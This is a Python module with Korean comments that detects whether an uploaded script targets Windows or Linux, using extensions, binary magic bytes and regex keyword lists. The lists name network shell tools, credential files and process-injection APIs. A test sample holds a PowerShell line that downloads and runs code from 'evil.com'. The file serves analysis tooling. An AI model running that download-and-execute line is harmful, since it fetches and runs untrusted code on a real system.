"""
os_detector.py — 업로드된 스크립트의 타겟 OS를 자동 감지합니다.

감지 우선순위:
  1. 파일 확장자 (가장 확실)
  2. 파일 내용 키워드 분석
  3. 바이너리 매직 바이트 (ELF/PE)
"""

from __future__ import annotations
import os
import re
from typing import Literal

OSType = Literal["windows", "linux", "unknown"]

# ── 확장자 기반 매핑 ──────────────────────────────────────────────
WINDOWS_EXTENSIONS = {
    ".bat", ".cmd", ".ps1", ".psm1", ".psd1",
    ".vbs", ".vbe", ".wsf", ".wsh", ".reg",
    ".hta", ".inf", ".msi", ".msp",
}
LINUX_EXTENSIONS = {
    ".sh", ".bash", ".zsh", ".fish", ".ksh", ".csh",
    ".pl", ".rb", ".py",  # Python/Perl/Ruby도 주로 Linux 타겟
    # (단, .py는 크로스플랫폼이므로 내용 분석으로 보완)
}

# ── Windows 키워드 패턴 ──────────────────────────────────────────
WINDOWS_PATTERNS = [
    # CMD/Batch
    r"(?i)\b(echo off|@echo|goto|setlocal|endlocal|call [a-z]|for \/[fl]|if exist|ren )\b",
    r"(?i)\b(reg (add|delete|query|export|import)|regsvr32|rundll32)\b",
    r"(?i)\b(net (user|group|localgroup|share|use|start|stop)|sc (create|start|stop|delete))\b",
    r"(?i)\b(schtasks|taskkill|tasklist|bcdedit|wmic|mshta|cscript|wscript)\b",
    r"(?i)\b(powershell|pwsh|cmd\.exe|command\.com)\b",
    # PowerShell
    r"(?i)\$env:(APPDATA|TEMP|USERPROFILE|PROGRAMDATA|WINDIR|SYSTEMROOT)",
    r"(?i)(Invoke-Expression|IEX|New-Object|Add-Type|Start-Process|Set-ExecutionPolicy)",
    r"(?i)(Get-Process|Get-Service|Get-ChildItem|Set-ItemProperty|New-ItemProperty)",
    r"(?i)(HKLM:|HKCU:|Registry::|\\\\SOFTWARE\\\\)",
    # Windows paths
    r"(?i)(C:\\\\(Windows|Users|Program Files|ProgramData|System32|SysWOW64))",
    r"(?i)(\\\\AppData\\\\(Roaming|Local)|\\\\Temp\\\\[A-Za-z])",
    # VBScript
    r"(?i)(WScript\.(Shell|Network|CreateObject)|CreateObject\(\"(WScript|ADODB|Shell)\"\))",
    # Windows API
    r"(?i)(VirtualAlloc|WriteProcessMemory|CreateThread|LoadLibrary|GetProcAddress)",
]

# ── Linux 키워드 패턴 ──────────────────────────────────────────
LINUX_PATTERNS = [
    # Shebang
    r"^#![ ]*/(?:bin|usr/bin|usr/local/bin)/(?:bash|sh|zsh|python|perl|ruby)",
    # Linux commands
    r"(?i)\b(chmod|chown|sudo|apt(-get)?|yum|dnf|pacman|systemctl|service)\b",
    r"(?i)\b(iptables|nftables|ufw|crontab|cron\.d|/etc/cron)\b",
    r"(?i)\b(curl|wget|nc|netcat|ncat|socat|ssh|scp|rsync)\b",
    r"(?i)\b(grep|awk|sed|cut|sort|uniq|tee|head|tail|xargs)\b",
    # Linux paths
    r"(?i)(/etc/(passwd|shadow|sudoers|hosts|cron|ssh|systemd)|/proc/\w|/dev/\w)",
    r"(?i)(/var/(log|www|run|tmp)|/home/\w+/\.|/root/\.)",
    r"(?i)(/usr/(bin|lib|local|share)|/bin/(bash|sh|python))",
    # Linux env
    r"\$HOME|\$USER|\$SHELL|\$PATH|\$LD_",
    r"(?i)(export [A-Z_]+=|source \.|/dev/null|>&\s*/dev/null)",
]

# ── ELF / PE 매직 바이트 ─────────────────────────────────────────
ELF_MAGIC = b"\x7fELF"
PE_MAGIC  = b"MZ"


def detect_os(filename: str, content: bytes | str) -> dict:
    """
    Returns:
      {
        "target_os": "windows" | "linux" | "unknown",
        "confidence": "high" | "medium" | "low",
        "reason": str,
      }
    """
    ext = os.path.splitext(filename)[1].lower()

    # 1) 확장자가 명확할 때
    if ext in WINDOWS_EXTENSIONS:
        return {"target_os": "windows", "confidence": "high",
                "reason": f"파일 확장자 {ext}는 Windows 전용 스크립트"}
    if ext in LINUX_EXTENSIONS and ext != ".py":
        return {"target_os": "linux", "confidence": "high",
                "reason": f"파일 확장자 {ext}는 Linux/Unix 셸 스크립트"}

    # 2) 바이너리 매직 바이트
    raw = content if isinstance(content, bytes) else content.encode("utf-8", errors="replace")
    if raw[:4] == ELF_MAGIC:
        return {"target_os": "linux", "confidence": "high",
                "reason": "ELF 바이너리 (Linux 실행파일)"}
    if raw[:2] == PE_MAGIC:
        return {"target_os": "windows", "confidence": "high",
                "reason": "PE 바이너리 (Windows 실행파일)"}

    # 3) 텍스트 내용 키워드 분석
    text = content if isinstance(content, str) else content.decode("utf-8", errors="ignore")

    win_score  = sum(1 for p in WINDOWS_PATTERNS if re.search(p, text))
    linux_score = sum(1 for p in LINUX_PATTERNS  if re.search(p, text))

    total = win_score + linux_score
    if total == 0:
        return {"target_os": "unknown", "confidence": "low",
                "reason": "OS 특정 패턴을 찾을 수 없음"}

    if win_score > linux_score:
        conf = "high" if win_score >= 3 else "medium"
        return {"target_os": "windows", "confidence": conf,
                "reason": f"Windows 키워드 {win_score}개 감지 (Linux {linux_score}개)"}
    elif linux_score > win_score:
        conf = "high" if linux_score >= 3 else "medium"
        return {"target_os": "linux", "confidence": conf,
                "reason": f"Linux 키워드 {linux_score}개 감지 (Windows {win_score}개)"}
    else:
        return {"target_os": "unknown", "confidence": "low",
                "reason": f"Windows/Linux 키워드 동수 ({win_score}개씩) — 크로스플랫폼 가능성"}


# ── 빠른 테스트 ──────────────────────────────────────────────────
if __name__ == "__main__":
    samples = [
        ("setup.bat",  b"@echo off\nreg add HKLM\\SOFTWARE\\test /v key /t REG_SZ /d value\n"),
        ("install.sh", b"#!/bin/bash\napt-get install -y curl\nchmod +x /usr/local/bin/tool\n"),
        ("payload.ps1", b"$env:TEMP\nInvoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com')\n"),
        ("script.py",  b"import os\nos.system('whoami')\n"),
        ("unknown.txt", b"hello world\n"),
    ]
    for name, data in samples:
        result = detect_os(name, data)
        print(f"{name:15s} → {result['target_os']:8s} [{result['confidence']}]  {result['reason']}")
